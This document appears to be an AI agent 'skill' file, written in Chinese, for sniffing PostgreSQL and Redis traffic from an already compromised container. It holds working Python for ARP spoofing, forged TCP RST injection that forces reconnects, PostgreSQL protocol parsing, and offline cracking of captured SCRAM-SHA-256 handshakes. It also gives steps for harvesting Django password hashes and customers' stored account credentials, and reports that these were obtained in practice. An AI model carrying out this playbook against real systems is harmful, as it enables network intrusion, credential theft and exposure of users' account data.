---
name: db-traffic-mitm-capture
description: 容器内被动MITM截获DB流量(PG/Redis)与SCRAM认证。Use when已控容器内需拿DB数据。
---

# 数据库流量 MITM 嗅探捕获（从已控容器被动截获）

## 触发条件
- 已通过 RCE 拿下某容器（Nginx Proxy Manager / 应用容器 / sidecar），
  内网存在 PostgreSQL / Redis / MySQL（如 172.18.0.2:5432）
- 应用（Django 等）通过**连接池**持久连接数据库
- 目标：不爆破数据库密码，直接被动截获 SQL 查询、返回数据
  （含 auth_user 密码哈希、订单/卡密）、SCRAM 认证握手、Redis AUTH 密码

## 核心原理
1. **ARP 欺骗**：容器有 `NET_RAW`（CapEff 含 NET_RAW，如 0xa80425fb）即可用
   AF_PACKET 原始套接字做双向 ARP 欺骗，让宿主/GW 认为 DB 的 MAC 是我们的容器 MAC。
   **不需要 NET_ADMIN**。
2. **RST 注入**：连接池的已建立 TCP 连接不受 ARP 欺骗影响（MAC 已在连接表中）。
   必须伪造 RST 包打断现有连接，迫使应用重连——重连的新连接才经过我们的 eth0。
3. **被动嗅探**：AF_PACKET SOCK_RAW 抓 eth0，按数据库协议解析。

**致命坑**：发往 172.18.0.2:5432 的包到达容器后会被内核 `ip_forward` 直接转发到真 DB，
**不会交给本地监听 socket**——所以"监听 5432 做 TCP 代理"在没有 NET_ADMIN 时不可行
（无法 iptables REDIRECT / IP 别名接管）。被动嗅探是唯一可靠路径。

## 关键实现

### ARP 双向欺骗（每 ~1s 重发）
```python
def arp_send(sock, tgt_ip, tgt_mac, spoof_ip):
    eth = mac_bytes(tgt_mac) + mac_bytes(OUR_MAC) + struct.pack('!H', 0x0806)
    a = struct.pack('!HHBBH6s4s6s4s', 1, 0x0800, 6, 4, 2,
                    mac_bytes(OUR_MAC), socket.inet_aton(spoof_ip),
                    mac_bytes(tgt_mac), socket.inet_aton(tgt_ip))
    sock.send(eth + a)
# 双向: arp_send(GW, gw_mac, PG_IP); arp_send(PG, pg_mac, GW_IP)
```
- 欺骗前先解析真实 MAC（主动 ARP request 或 /proc/net/arp）。
  实测 Docker 网桥环境：GW=`42:db:5a:51:81:d8`, DB=`3e:44:f2:eb:de:71` 一类。
- **副作用**：欺骗污染宿主 ARP 缓存 → TCP recv 超时（流量黑洞）。
  结束必须跑 arp_repair（向 GW/DB 广播真实 MAC）恢复。

### RST 注入（强制应用断连重连）
```python
def build_rst(src_ip, src_port, dst_ip, dst_port, seq, ack):
    ip_hdr = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 40, 0, 0, 64, 6, 0,
                         socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    tcp_hdr = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack,
                          0x14, 0, 0, 0, 0)  # 0x14 = RST|ACK
    csum = tcp_checksum(src_ip, dst_ip, tcp_hdr)
    tcp_hdr = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack,
                          0x14, 0, 0, csum, 0)
    return ip_hdr + tcp_hdr
```
- 高频打 RST（0.15s 间隔打 DB 端口方向），应用每次重连都被打断，
  重连的新连接流量就会经过 eth0 被抓到。
- 打 Redis(6379) 也可迫使 Celery/Django 重发 AUTH 密码。

### PG 协议被动解析（核心）
```python
# 消息: 1字节类型 + int32 长度 + body
# 'Q'=简单查询(明文SQL) 'T'=行描述(列名) 'D'=DataRow 'C'=CommandComplete
# 'S'=ParameterStatus 'R'=Authentication 'K'=BackendKeyData
def parse_pg(payload):
    i, msgs = 0, []
    while i < len(payload):
        t = chr(payload[i]); ln = struct.unpack('!I', payload[i+1:i+5])[0]
        body = payload[i+5:i+5+ln-4]; i += 5 + ln - 4
        if t == 'D':
            n = struct.unpack('!H', body[:2])[0]; vals, j = [], 2
            for _ in range(n):
                vl = struct.unpack('!I', body[j:j+4])[0]; j += 4
                if vl == -1: vals.append(None)
                else: vals.append(body[j:j+vl].decode(errors='replace')); j += vl
            msgs.append(('D', vals))
        elif t in ('Q','T','C','S'):
            msgs.append((t, body.rstrip(b'\x00').decode(errors='replace')))
    return msgs
```
**两个致命坑（实测踩过）**：
1. 脚本**不要依赖"先见 SYN 再建连接跟踪"**——ARP 欺骗生效可能晚于连接建立，
   已建立连接的包若不在跟踪表会被全部丢弃 → 0 命中。直接对每个 TCP 包 payload
   尝试解析（无连接跟踪版本才成功），跨包分片消息丢弃或重排。
2. DataRow 字段**变长**（int32 长度前缀），必须逐字段读长度再切片；
   `struct.unpack('!I', body[j:j+4])` 越界会抛异常，需捕获。

## SCRAM-SHA-256 认证捕获与离线验证
PG 默认 scram-sha-256。抓完整三段：
- client-first: `R`(AuthenticationSASL) 后 `p` 消息
- server-first: `r=nonce,s=<base64 salt>,i=<iterations>`（如 `s=RoOV4sKGclcscukSNlqhcw==,i=4096`）
- client-final: `c=biws,r=nonce,p=<proof>`

离线验证密码（不算在线爆破，可跑任意词表）：
```python
import hashlib, hmac, base64, re
def verify(cf_bare, sf, cf_final, password):
    salt = base64.b64decode(re.search(r's=([^,]+)', sf).group(1))
    iterations = int(re.search(r'i=(\d+)', sf).group(1))
    salted = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, iterations)
    ck = hmac.new(salted, b'Client Key', hashlib.sha256).digest()
    sk = hashlib.sha256(ck).digest()
    auth_msg = cf_bare + ',' + sf + ',' + cf_final.split(',p=')[0]
    sig = hmac.new(sk, auth_msg.encode(), hashlib.sha256).digest()
    proof = base64.b64decode(re.search(r'p=([^,]+)', cf_final).group(1))
    return bytes(a ^ b for a, b in zip(ck, proof)) == sig
```
- 实测 5373 词（nmap 密码表）未中 → 密码不在常见弱口令表，别硬刚。
- 更划算：**Django 登录视图触发 `SELECT ... FROM auth_user WHERE username='xxx'`
  返回目标用户完整 pbkdf2 密码哈希**，正常提交登录（CSRF 正确）即可顺带抓哈希，
  用 hashcat -m 10000 离线破解。

## Django CSRF Secure-cookie 坑（登录测试必看）
Django csrftoken cookie 带 `Secure` 标志，Python `requests` 对 http:// 请求
**不会发送 Secure cookie** → 登录必 403。解法：手动构造 Cookie 头：
```python
headers = {'Cookie': f'csrftoken={csrf}; sessionid={sid}',
           'X-CSRFToken': csrf, 'Referer': base + '/accounts/login/'}
```
若仍 403/500：确认表单 token 与 cookie token 是否一致（Django 4 lazy token，
需用 X-CSRFToken 头带 cookie 值）。

## 数据利用路径（实测拿到）
- auth_user 表 → `pbkdf2_sha256$1000000$...` 密码哈希（hashcat -m 10000）
- proxy_order 表 → `product_keys` JSON 字段 = 完整账号卡密（`email|password|2FA`）
- django_session 表 → 若拿到 SECRET_KEY 可伪造任意用户会话
- 订单/商品/余额表 → 全量业务数据

## 复现清单
1. 容器内确认 NET_RAW：`grep CapEff /proc/self/status`（0xa80425fb 含 NET_RAW）
2. 起三个线程：ARP 双向欺骗(~1s) + RST 注入(0.15s) + 嗅探(AF_PACKET)
3. 从攻击机触发应用请求（商品列表、登录 POST 等）制造 DB 流量
4. grep 输出 `Q>`/`T>`/`D>` 提取 SQL、列名、数据行
5. 结束跑 arp_repair 恢复真实 MAC

## 相关技能
- database-security（用户技能，DB 漏洞利用全栈）
- network-penetration-testing（ARP/网络攻击）
- container-security-testing（容器逃逸/横向）